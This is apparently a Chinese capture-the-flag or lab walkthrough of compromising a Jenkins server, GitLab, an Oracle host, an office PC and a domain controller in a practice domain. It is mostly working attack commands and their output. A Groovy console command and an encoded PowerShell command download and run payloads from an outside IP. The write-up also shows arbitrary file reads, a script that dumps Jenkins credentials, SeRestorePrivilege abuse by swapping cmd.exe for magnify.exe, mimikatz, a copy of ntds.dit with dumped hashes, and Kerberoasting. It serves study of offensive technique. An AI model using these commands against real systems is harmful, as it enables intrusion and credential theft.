<html>
<body>
<!--StartFragment--><!-- obsidian --><p>这台机子细节还是挺多的，后面打win参考了挺多wp，毕竟win也才刚入门</p>
<h1 data-heading="外网">外网</h1>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# fscan -h 39.99.149.80

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &#x3C;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.149.80:80 open
39.99.149.80:3306 open
39.99.149.80:135 open
39.99.149.80:139 open
39.99.149.80:8080 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]39.99.149.80
   [->]XR-JENKINS
   [->]172.22.14.7
[*] WebTitle http://39.99.149.80:8080  code:403 len:548    title:None
已完成 5/5
[*] 扫描结束,耗时: 11.230299365s
</code></pre>
<p>8080是jenkins，80是WordPress，根据hint</p>
<pre><code>请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins\.jenkins。
</code></pre>
<p>意思是80有个备份文件然后读jenkins配置文件拿凭据，进后台执行命令，先了解几个基础</p>
<h3 data-heading="Jenkins 配置">Jenkins 配置</h3>
<pre><code>C:\ProgramData\Jenkins\.jenkins\
├─ config.xml                         # Jenkins 主配置 / 系统设置
├─ credentials.xml                    # 全局凭据配置
├─ secret.key                         # 密钥文件
├─ secrets\                           # 加密密钥目录
├─ jobs\
│   └─ &#x3C;任务名>\config.xml            # 每个 Job / Pipeline 的配置
├─ nodes\
│   └─ &#x3C;节点名>\config.xml            # 构建节点配置
├─ users\
│   └─ &#x3C;用户名>\config.xml            # 用户配置
├─ plugins\                           # 已安装插件
├─ workspace\                         # 工作区
├─ logs\                              # 日志
└─ init.groovy.d\                     # 启动时执行的 Groovy 初始化脚本
</code></pre>
<p><strong>首次登录的初始管理员密码</strong></p>
<pre><code>C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
</code></pre>
<p><strong>Jenkins 保存的凭据密码以及解密凭证</strong></p>
<pre><code>C:\ProgramData\Jenkins\.jenkins\credentials.xml
C:\ProgramData\Jenkins\.jenkins\secret.key
C:\ProgramData\Jenkins\.jenkins\secrets\master.key
C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret
</code></pre>
<p><strong>某个 Jenkins 用户的登录密码</strong></p>
<pre><code>C:\ProgramData\Jenkins\.jenkins\users\&#x3C;用户名>\config.xml #bcrypt 哈希(依旧是这个四万亿东西)
</code></pre>
<p>这里hint说了是初次登录，所以很容易读到密码，接下来就是怎么读了</p>
<h3 data-heading="file_read">file_read</h3>
<p>这里我打的多了手动试出来了www.zip，dirsearch我记得是能扫出来的</p>
<p>wordpress的数据库连接密码在这里，不过没什么用</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/www/WWW]
└─# cat wp-config.php
&#x3C;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

define( 'WP_AUTO_UPDATE_CORE', false );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', '3%I$A*gl&#x26;9^b#' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '[{18.7% y{Q&#x3C;:uP(8xecEM,#SU&#x3C;T(,a,X*]t],o(_0uX/7W`W2y7CW!u-.?pw4=v' );
define( 'SECURE_AUTH_KEY',  'LZ MSYI?*_1XVW_9lE.h_?Wv+sqXa:BG$,D]L=)#&#x26;/6W8&#x26;Mn/t%Gu8obB:t!Kkqk' );
define( 'LOGGED_IN_KEY',    '&#x26;aJPFTU}/B*:B9c9#A{BP}Spzn`-^z%5?0=a^4]S7I{^c@Udb^r#}/r^W&#x26; DBc)v' );
define( 'NONCE_KEY',        '1)yt;PW$ARR?w,bZn`n1CiU1jjJEx8]@ekktn4o/3{B$~a{XQgQBd|2g8n@bjvq7' );
define( 'AUTH_SALT',        'aFp{DC|mXLBS4:V0k?i,zV$7r^jf^l(n&#x26;5H+3i $Z 3J1~ps04|{t?hs(5a+O&#x26;pa' );
define( 'SECURE_AUTH_SALT', '0BXB8~^ENT%9e$&#x26;p#cqayQ:l-.^3kmvreqpMW$b`{BV6,E7|owxr4Dff&#x3C;C0S%{em' );
define( 'LOGGED_IN_SALT',   'cL]C_YQ%*j!sdj]drN;Hc%&#x26;{&#x3C;.uTt-c05HCI] n2fORddX`@0&#x26;tBA`&#x3C;ngLQ^=9YE' );
define( 'NONCE_SALT',       'vtdX~9B4t`wb]&#x3C;;_R}?>[zDHpEt8)aO>:ev #t=Meni-QO>~fxX)&#x3C;2853JBNi&#x26;J:' );

define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] );
define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

</code></pre>
<p>读文件在这里</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/www/WWW/tools]
└─# cat content-log.php
&#x3C;?php
$logfile = rawurldecode( $_GET['logfile'] );
// Make sure the file is exist.
if ( file_exists( $logfile ) ) {
  // Get the content and echo it.
  $text = file_get_contents( $logfile );
  echo( $text );
}
exit;
</code></pre>
<p>admin凭据</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/www/WWW/tools]
└─# curl 'http://39.99.149.80/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword'
510235cf43f14e83b88a9f144199655b
</code></pre>
<p>直接登录然后jenkins脚本控制台执行命令上线vshell即可</p>
<pre><code class="language-java">def cmd = 'certutil.exe -urlcache -split -f http://211.159.175.21:2333/swt C:\\Users\\Public\\run.bat &#x26;&#x26; C:\\Users\\Public\\run.bat'
def pb = new ProcessBuilder('cmd', '/c', cmd)
pb.redirectErrorStream(true)
def proc = pb.start()
def out = proc.inputStream.text
proc.waitFor()
println out
</code></pre>
<h1 data-heading="内网">内网</h1>
<p>hint</p>
<pre><code>管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。
依旧fscan
</code></pre>

IP | 主机名 | 系统 / 域 | 主要开放服务
-- | -- | -- | --
172.22.14.11 | XR-DC | Windows Server 2022 / xiaorang.lab | DNS、RPC、LDAP、SMB、RDP、WinRM、Spark
172.22.14.16 | 未识别 | 未识别 | SSH、HTTP / GitLab
172.22.14.31 | XR-ORACLE | Windows Server 2019 / WORKGROUP | RPC、SMB、RDP、Orcale
172.22.14.46 | XR-0923 | Windows Server 2022 / xiaorang.lab | IIS、RPC、SMB、RDP、WinRM


<pre><code class="language-powershell">Remove-Item C:\Windows\Temp\file.dsh -Force -ErrorAction SilentlyContinue
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'set metadata C:\Windows\Temp\meta.cab' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'set context persistent nowriters' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'add volume c: alias ntds' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'create' -Encoding ASCII
Add-Content -Path C:\Windows\Temp\file.dsh -Value 'expose %ntds% z:' -Encoding ASCII
</code></pre>
<pre><code class="language-powershell">diskshadow /s C:\Windows\Temp\file.dsh
</code></pre>
<pre><code class="language-powershell">
robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
robocopy /b Z:\Windows\System32\config C:\Windows\Temp SYSTEM

这里绝对路径会有问题推荐还是进到目录直接拷贝，包括接下来下载最好都是进到目录
</code></pre>
<pre><code class="language-powershell">download C:\Windows\Temp\ntds.dit /tmp/test/ntds.dit
download C:\Windows\Temp\SYSTEM /tmp/test/SYSTEM
</code></pre>
<p>解密</p>
<pre><code class="language-bash">┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 8cca939cb8a94a304d33209b41a99517
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
XR-DC$:1000:aad3b435b51404eeaad3b435b51404ee:28b508bccbc765e1779134fc309ee161:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4b2afb57dd0833ee9ed732ea89c263a3:::
</code></pre>
<p>接下来直接winrm hash传递即可</p><!--EndFragment-->
</body>
</html>这台机子细节还是挺多的，后面打win参考了挺多wp，毕竟win也才刚入门

# 外网

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# fscan -h 39.99.149.80

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
39.99.149.80:80 open
39.99.149.80:3306 open
39.99.149.80:135 open
39.99.149.80:139 open
39.99.149.80:8080 open
[*] alive ports len is: 5
start vulscan
[*] NetInfo
[*]39.99.149.80
   [->]XR-JENKINS
   [->]172.22.14.7
[*] WebTitle http://39.99.149.80:8080  code:403 len:548    title:None
已完成 5/5
[*] 扫描结束,耗时: 11.230299365s
```

8080是jenkins，80是WordPress，根据hint

```
请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 C:\ProgramData\Jenkins\.jenkins。
```
意思是80有个备份文件然后读jenkins配置文件拿凭据，进后台执行命令，先了解几个基础

### Jenkins 配置

```
C:\ProgramData\Jenkins\.jenkins\
├─ config.xml                         # Jenkins 主配置 / 系统设置
├─ credentials.xml                    # 全局凭据配置
├─ secret.key                         # 密钥文件
├─ secrets\                           # 加密密钥目录
├─ jobs\
│   └─ <任务名>\config.xml            # 每个 Job / Pipeline 的配置
├─ nodes\
│   └─ <节点名>\config.xml            # 构建节点配置
├─ users\
│   └─ <用户名>\config.xml            # 用户配置
├─ plugins\                           # 已安装插件
├─ workspace\                         # 工作区
├─ logs\                              # 日志
└─ init.groovy.d\                     # 启动时执行的 Groovy 初始化脚本
```

**首次登录的初始管理员密码**

```
C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
```

**Jenkins 保存的凭据密码以及解密凭证**

```
C:\ProgramData\Jenkins\.jenkins\credentials.xml
C:\ProgramData\Jenkins\.jenkins\secret.key
C:\ProgramData\Jenkins\.jenkins\secrets\master.key
C:\ProgramData\Jenkins\.jenkins\secrets\hudson.util.Secret
```

**某个 Jenkins 用户的登录密码**

```
C:\ProgramData\Jenkins\.jenkins\users\<用户名>\config.xml #bcrypt 哈希(依旧是这个四万亿东西)
```

这里hint说了是初次登录，所以很容易读到密码，接下来就是怎么读了

### file_read

这里我打的多了手动试出来了www.zip，dirsearch我记得是能扫出来的

wordpress的数据库连接密码在这里，不过没什么用

```bash
┌──(root㉿MJ)-[/tmp/test/www/WWW]
└─# cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

define( 'WP_AUTO_UPDATE_CORE', false );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', '3%I$A*gl&9^b#' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '[{18.7% y{Q<:uP(8xecEM,#SU<T(,a,X*]t],o(_0uX/7W`W2y7CW!u-.?pw4=v' );
define( 'SECURE_AUTH_KEY',  'LZ MSYI?*_1XVW_9lE.h_?Wv+sqXa:BG$,D]L=)#&/6W8&Mn/t%Gu8obB:t!Kkqk' );
define( 'LOGGED_IN_KEY',    '&aJPFTU}/B*:B9c9#A{BP}Spzn`-^z%5?0=a^4]S7I{^c@Udb^r#}/r^W& DBc)v' );
define( 'NONCE_KEY',        '1)yt;PW$ARR?w,bZn`n1CiU1jjJEx8]@ekktn4o/3{B$~a{XQgQBd|2g8n@bjvq7' );
define( 'AUTH_SALT',        'aFp{DC|mXLBS4:V0k?i,zV$7r^jf^l(n&5H+3i $Z 3J1~ps04|{t?hs(5a+O&pa' );
define( 'SECURE_AUTH_SALT', '0BXB8~^ENT%9e$&p#cqayQ:l-.^3kmvreqpMW$b`{BV6,E7|owxr4Dff<C0S%{em' );
define( 'LOGGED_IN_SALT',   'cL]C_YQ%*j!sdj]drN;Hc%&{<.uTt-c05HCI] n2fORddX`@0&tBA`<ngLQ^=9YE' );
define( 'NONCE_SALT',       'vtdX~9B4t`wb]<;_R}?>[zDHpEt8)aO>:ev #t=Meni-QO>~fxX)<2853JBNi&J:' );

define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] );
define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

读文件在这里

```bash
┌──(root㉿MJ)-[/tmp/test/www/WWW/tools]
└─# cat content-log.php
<?php
$logfile = rawurldecode( $_GET['logfile'] );
// Make sure the file is exist.
if ( file_exists( $logfile ) ) {
  // Get the content and echo it.
  $text = file_get_contents( $logfile );
  echo( $text );
}
exit;
```

admin凭据

```bash
┌──(root㉿MJ)-[/tmp/test/www/WWW/tools]
└─# curl 'http://39.99.149.80/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword'
510235cf43f14e83b88a9f144199655b
```

直接登录然后jenkins脚本控制台执行命令上线vshell即可

```java
def cmd = 'certutil.exe -urlcache -split -f http://211.159.175.21:2333/swt C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat'
def pb = new ProcessBuilder('cmd', '/c', cmd)
pb.redirectErrorStream(true)
def proc = pb.start()
def out = proc.inputStream.text
proc.waitFor()
println out
```

# 内网

hint

```
管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。
依旧fscan
```

| IP             | 主机名         | 系统 / 域                               | 主要开放服务                           |
| -------------- | ----------- | ------------------------------------ | -------------------------------- |
| `172.22.14.11` | `XR-DC`     | Windows Server 2022 / `xiaorang.lab` | DNS、RPC、LDAP、SMB、RDP、WinRM、Spark |
| `172.22.14.16` | 未识别         | 未识别                                  | SSH、HTTP / GitLab                |
| `172.22.14.31` | `XR-ORACLE` | Windows Server 2019 / `WORKGROUP`    | RPC、SMB、RDP、Orcale               |
| `172.22.14.46` | `XR-0923`   | Windows Server 2022 / `xiaorang.lab` | IIS、RPC、SMB、RDP、WinRM            |

jenkins一般会连接其他挺多服务的，Gitlab就是比较常规的一个

```java
import jenkins.model.*
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import hudson.util.Secret

def creds = CredentialsProvider.lookupCredentials(
    Credentials.class,
    Jenkins.instance,
    null,
    null
)

println "========== CREDENTIALS DUMP =========="
creds.each { c ->
    println "--- Credential ID: ${c.id} ---"
    // 尝试获取用户名/密码
    try {
        def username = c.username
        def password = c.password?.getPlainText()
        println "Username: ${username}, Password: ${password}"
    } catch (e) {}
    // 尝试获取 Secret 文本（如 API Token）
    try {
        def secret = c.secret?.getPlainText()
        println "Secret: ${secret}"
    } catch (e) {}
    // 尝试获取 SSH 私钥
    try {
        def privateKey = c.getPrivateKey()
        println "SSH Private Key: ${privateKey}"
    } catch (e) {}
    // 尝试获取其他属性（如 certificate）
    try {
        println "All properties: ${c.properties}"
    } catch (e) {}
}
```

拿一下PRIVATE-TOKEN
```
========== CREDENTIALS DUMP ==========
--- Credential ID: 9eca4a05-e058-4810-b952-bd6443e6d9a8 ---
All properties: [class:class com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl, apiToken:glpat-7kD_qLH2PiQv_ywB9hz2, id:9eca4a05-e058-4810-b952-bd6443e6d9a8, descriptor:com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl$DescriptorImpl@3394859e, scope:GLOBAL, description:]
Result: [com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl@3a621879]
```
带着这个token去拉git的仓库找信息就行了

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc curl -H "PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2" "http://172.22.14.16/api/v4/projects" | python3 ez.py | grep path_with_namespace
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0[proxychains] Strict chain  ...  211.159.175.21:10001  ...  172.22.14.16:80  ...  OK
100  19189   0  19189   0      0  67285      0                              0
    "path_with_namespace": "xrlab/internal-secret",
    "path_with_namespace": "xrlab/xradmin",
    "path_with_namespace": "xrlab/awenode",
    "path_with_namespace": "xrlab/xrwiki",
    "path_with_namespace": "gitlab-instance-23352f48/Monitoring",

```
五个仓库很显眼的secret和xradmin

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc git clone http://172.22.14.16:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git               
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc git clone http://172.22.14.16:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git 
```
拉到本地secret有很多组凭据，xradmin里面能找到Orcale的凭据，这里有一点连接Orcale的时候得知道SID，因为这端口只是个监听器，中间要转发没有SID连不上，默认ORCL，也可以爆破

```bash
odat sidguesser -s 172.22.14.31 -p 1521 --sids-file=sids.txt
```

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# cat xradmin/ruoyi-admin/src/main/resources/application-druid.yml
# 数据源配置
spring:
    datasource:
        type: com.alibaba.druid.pool.DruidDataSource
        driverClassName: oracle.jdbc.driver.OracleDriver
        druid:
            # 主库数据源
            master:
                url: jdbc:oracle:thin:@172.22.14.31:1521/orcl
                username: xradmin
                password: fcMyE8t9E4XdsKf
```

并不是system用户但是能以sysdba身份登录，这里我最开始用MDUT拿不掉，后来走的odat了，不过没回显，也没法读文件，看wp直接net个管理上去了，也不知道怎么知道是system权限的，真比赛打到了还是直接外网转发端口上线vshell吧

外网机
```cmd
netsh interface portproxy add v4tov4 ^
  listenport=10086 ^
  listenaddress=0.0.0.0 ^
  connectport=2333 ^
  connectaddress=211.159.175.21
  
sc config iphlpsvc start= auto
net start iphlpsvc

netsh advfirewall firewall add rule ^
  name="PortForward10086" ^
  dir=in action=allow protocol=TCP localport=10086
  
netsh interface portproxy show all

```

orcale

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# ENC=$(python3 - <<'PY'
import base64
script = r"""$u='http://172.22.14.7:10086/swt'; $o='C:\Users\Public\run.bat'; (New-Object Net.WebClient).DownloadFile($u,$o); Start-Process $o"""
print(base64.b64encode(script.encode('utf-16-le')).decode())
PY
)

┌──(root㉿MJ)-[/tmp/test/yunjing]
└─# pc odat dbmsscheduler \
  -s 172.22.14.31 -p 1521 -d orcl \
  -U xradmin -P fcMyE8t9E4XdsKf --sysdba \
  --exec "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -EncodedCommand $ENC"
```

复现的时候这里半天上不来，那就走正向上吧


然后打第三个

### SeRestorePrivilege

hint

```
攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。
```

详细的九大权限
[[windows九大权限的分析与利用_setcbprivilege-CSDN博客](https://blog.csdn.net/qq_41874930/article/details/111963586)](https://blog.csdn.net/qq_41874930/article/details/111963586)

<img width="1426" height="872" alt="Image" src="https://github.com/user-attachments/assets/1fd43be7-03c2-42b4-ad02-989d156085a4" />

最开始在secret拿的凭据直接爆破，也可以爆破域账户，但是实际测试是本地账户

```
proxychains4 crackmapexec smb 172.22.14.46 -u user.txt -p pass.txt --no-bruteforce --local-auth --continue-on

SMB         172.22.14.46    445    XR-0923          [+] XR-0923\zhangshuai:wSbEajHzZs
```

这里试了一下rdp直接上去了，但是zhangshuai不是administrators组成员

```cmd
C:\Users\zhangshuai>whoami /priv

特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用
```
这是rdp上去的特权

```powershell
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> whoami /priv

特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeRestorePrivilege            还原文件和目录 已启用
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用
```

这是winrm上去的特权

**原因**

本地安全策略单独授予了 SeRestorePrivilege  
路径：`secpol.msc` → 本地策略 → 用户权利分配 → "备份文件和目录" / "还原文件和目录"  
如果这个权限被显式授予了 zhangshuai 或 Users 组，RDP 里被 UAC 过滤掉，WinRM 里保留

|维度|SeRestorePrivilege|镜像劫持（IFEO）|
|---|---|---|
|**是什么**|Windows 的一种特权（Privilege）|一种注册表劫持技术|
|**属于**|访问控制模型|持久化 / 提权技术|
|**前提**|当前账户已被授予该特权|对 IFEO 注册表键有写权限|
|**利用对象**|文件系统 ACL|注册表 + 程序启动流程|
|**提权目标**|从普通管理员 → SYSTEM，或读敏感文件|从管理员 → SYSTEM，或持久化|
|**触发方式**|替换文件后等合法程序执行|目标程序被启动时自动触发|

- **SeRestorePrivilege**：需要**特权**。通常通过本地安全策略或组策略授予，普通用户默认没有。
    
- **IFEO**：需要**注册表写权限**。`HKLM\...\Image File Execution Options` 默认只有 Administrators 能写。
- 
前几天才打了镜像劫持，和这个好像但还是有区别的，这里我直接把cmd改成放大镜了

```powershell
*Evil-WinRM* PS C:\windows\system32> ren magnify.exe magnify.exe.bak

*Evil-WinRM* PS C:\windows\system32> ren cmd.exe magnify.exe
```
rdp连上去锁定页面点一下放大镜即可，建个管理员连上去抓个hash

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/internal-secret]
└─# pc xfreerdp3 /v:172.22.14.46 /u:mj /p:123.com /cert:ignore /drive:share,/tmp/test/yunjing/dc
```

### Kerberoasting

任何域用户都可以向域控请求**任意注册了 SPN 的服务账户**的 Kerberos TGS 票据，TGS 的一部分用**服务账户的 NTLM 哈希加密**。拿到 TGS 后离线爆破，就能还原服务账户明文密码。
```cmd
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::cache" "exit" > 1.txt


msv :
         [00000003] Primary
         * Username : XR-0923$
         * Domain   : XIAORANG
         * NTLM     : da10f633fe7ae168e22ff0ced59b31f4
         * SHA1     : d774da7dfa50166e65360267e10f3a7874b2d50f
```
主要是抓到了46这台机器账户的hash，可以向Kerberos请求SPN了

**SPN**

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/dc]
└─# pc GetUserSPNs.py xiaorang.lab/'XR-0923$' -hashes :da10f633fe7ae168e22ff0ced59b31f4 -dc-ip 172.22.14.11

ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation
-----------------------------  --------  --------------------------------------------------------  --------------------------  ---------  ----------
TERMSERV/xr-0923.xiaorang.lab  tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  <never>
WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  <never>
```

tianjing这个账户注册IIS所以抓到了

**TGS**

```bash
┌──(root㉿MJ)-[/tmp/test/yunjing/dc]
└─# pc GetUserSPNs.py xiaorang.lab/'XR-0923$' -hashes :da10f633fe7ae168e22ff0ced59b31f4 -dc-ip 172.22.14.11 -request-user tianjing -outputfile hash.txt

hashcat 13100 -> $krb5tgs$23$
hashcat 19700 -> $krb5tgs$18$

┌──(root㉿MJ)-[/tmp/test/yunjing/dc]
└─# hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*tianjing$XIAORANG.LAB$xiaorang.lab/tianjing*$e3d25214eb42d989ed878dbb5a5adb95$162dcfafa661da7b1ae62f418510b1e18a8dc94503ce3df7cf2745073dd65b1972bcfd3c27daaf7d75f75eebdbe1345506c1c6985c95cc996ca6c20fce08e1363249a4fd0747f82bc7bc7b574db52e66fd778a56efbd898125d2afeba7f6a5237ed4f94b3a2301e9fbe8ce28b82158f77d86f27275aff48ec46286464c0d53b648b219f365f721f06cf0a6c5104de845e0490c53b0b8eadd1761257534db7f47932df807e92273ce747b0894fe8f1e8c550ddba994f35a8f7b37156eab580c98ae5bc1db3550a1c1c51736c92e648827d3c81ba451b291d44bb7cb915cc6a330c9390085b0aeabebe598edec6395e9a4d31522088c12a595bef21096b0852d32777862640ac1d2b2d084cf1d43b7e5a1c798112c814016b7135e76f43710ac22d22fcc7d392c63de29dbe9830a302ef26758a78813f7d6c6e98fe537826fc5a79c13e96becf7180fb1d2b9973825e557570ccfeb11d140027e7ad001f4b38e7b43cd5de23eb28f9247a84d8493a2109297097ac08fed6d4ea0d10831e223ff3a0d8a8f5f359b9d883657626d3849997661aaf7e7b667c49fab83cbba8697c9d9a02ee332c6808568367e34aa0e6fadd4fbfa935ccd1d14b81b5c9931dd0b9702d58dfe4fb377872226fffacdcf8680a79c9d3e6144b9090462a11e817e16705d4281eb2dc2bcb32bf5bf35573e26d8e9cb3b332d3111ec0dc7f9251851ff9ca0e371615ac8e7e52f3f2f2024f243b3362ef9d6351d27a9bfca42b1f075703e567268fde234ee0a1173e934412bbddba3d9bef107963d5584f86a2a37c7dc0874377264b0f3eb8417b05fe6042